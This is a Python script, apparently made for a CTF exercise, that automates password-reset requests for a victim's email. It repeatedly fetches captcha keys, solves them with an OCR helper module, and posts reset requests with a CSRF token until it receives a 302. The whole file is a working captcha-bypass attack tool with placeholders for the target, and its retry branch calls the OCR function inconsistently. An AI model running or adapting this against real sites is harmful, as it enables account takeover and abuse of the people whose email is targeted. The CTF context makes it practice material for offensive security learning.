from Vision import read_image
import requests
import re
import time

"""_summary_
This script is used to automate the password reset process for the CyberPal CTF.
The script will send a password reset request to the server, and then use the Vision.py script to read the captcha.
The captcha is then sent back to the server, and the process is repeated until the password reset is successful.
    """
mail = "{{victim@victim.com}}" # Change this to the email address of the victim
base_url = "{{Base_URL}}"  # Change this to the URL of the password reset page
refresh_url = '{{Catpcha Refresh Page}}' # Change this to the URL of the captcha refresh page

headers = {
    'Host': '{{Host}}', # Change this to the host of the password reset page
    #Add any other headers that are required to send the password reset request
    'Connection': 'close'
}

proxy = {
    
    #Add proxy details if required to send the password reset request through BurpSuite
    'https': 'https://127.0.0.1:8080'
}


def attack(captcha, captcha_code, email):
    """_summary_
    This function sends the password reset request to the server, and returns the status code of the response.
    """
    print(f'captcha is: {captcha}')
    print(f'captcha_code is: {captcha_code}')    
    data = {
    'csrfmiddlewaretoken': '{{CSRF}}', # Change this to the CSRF token of the password reset page
    'email': email,
    'captcha_0': captcha,
    'captcha_1': captcha_code
}
    
    response = requests.post(url=base_url, headers=headers, data=data) #, proxies=proxy) # Uncomment this line if using BurpSuite
    request = response.request 
    return(response.status_code) # Return the status code of the response to the main function
    
    
# Aquire Captcha token
def get_captcha():
    """_summary_
    This function sends a GET request to the captcha refresh page, and returns the captcha token."""
    response = requests.get(refresh_url).json()
    return(response['new_captcha_key']) #The Value of the Captcha Image Location is returned to the main function


attempt = 0
while True:
    # Get Captcha
    captcha = get_captcha()
    captcha_code = read_image(captcha, base_url) # The captcha token is sent to the read_image function, which returns the captcha code as a string.  
    if captcha_code== 'FAIL':
        # If the captcha code is not read correctly, the captcha is refreshed and the process is repeated.
        captcha = get_captcha()
        captcha_code = read_image(captcha)
    status = attack(captcha=captcha, captcha_code=captcha_code, email=mail) # The captcha code is sent to the attack function, which returns the status code of the response.
    attempt = attempt + 1
    print(attempt)
    if status==302: # If the status code is 302, the password reset was successful, and the script will break out of the loop. Change it to the status code of the successful password reset response.
        break